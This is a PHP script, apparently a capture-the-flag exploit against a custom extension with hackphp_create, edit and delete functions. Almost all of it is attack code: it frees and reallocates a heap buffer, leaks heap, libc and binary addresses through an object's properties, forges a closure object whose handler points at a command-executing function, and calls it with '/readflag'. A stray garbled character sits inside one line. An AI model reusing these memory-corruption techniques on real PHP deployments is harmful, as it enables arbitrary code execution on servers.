<?php
   function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }
   function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;í
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

   echo "yes\n";
   class Helper{
      public    $a0,$a1,$a2,$a3,$a4,$a5,$a6,$a7,$a8,$a9,$a10,$a11,$a12,$a13,$a14,$a15,$a16,$a17,$a18,$a19,$a20,$a21,$a22,$a23,$a24,$a25,$a26,$a27,$a28,$a29,$a30,$a31,$a32,$a33,$a34,$a35,$a36,$a37,$a38,$a39;
   }
   $magic=ptr2str(0x600000001);
   $magic.=ptr2str(0);
   $magic.=ptr2str(0x2a0);
   $magic.="aaaaaa";
   hackphp_create(0x300);
   hackphp_edit("a");
   hackphp_delete();
   $n_alloc = 10; 
   $abc = str_shuffle(str_repeat('B', (0x300-0x60)));
   hackphp_create(0x300);
   $helper = new Helper();
   //hackphp_edit($magic);
   //var_dump($abc);
   $helper->a0 = "aaaaaaa";
   $helper->a1 = hackphp_create;
   $helper->a2 = "aaaaaaa";
   $helper->a3 = function ($x) { };
   $helper->a4 = "aaaaaaa";
   $helper->a5 = "aaaaaaa";
   $addr1=str2ptr($abc,32);
   echo dechex($addr1)."\n";
   write($abc,16,$addr1+0x28);
   $addr2=str2ptr($helper->a0,0x20);
   echo dechex($addr2)."\n";
   
   write($abc,0x30,$addr2+0x2c90+0x178-0x10);
   $addr3=strlen($helper->a2);
   $heap=$addr3;
   echo dechex($addr3)."\n";
   $libc=$addr3-0x7ffff77b0670+0x7ffff7622000;
   
   
   $addr4=str2ptr($abc,0x40);
   $fake_obj_offset = 0xd0;
   for($i = 0; $i < 0x110; $i += 8) {
        write($abc,0x50,$addr4-0x10+$i);
        write($abc, $fake_obj_offset + $i, strlen($helper->a4));
   }
   
   $exec=str2ptr($abc,0)-0xffe520;
   echo dechex($exec)."\n";
   //fgets(STDIN);
   write($abc, 0x40, $heap+0x18 + 0xd0);
   write($abc, 0xd0 + 0x38, 1, 4); 
   write($abc, 0xd0 + 0x68, $exec+0x3cb620);
   $cmd="/readflag";
   ($helper->a3)($cmd);
   //readline();
   
?>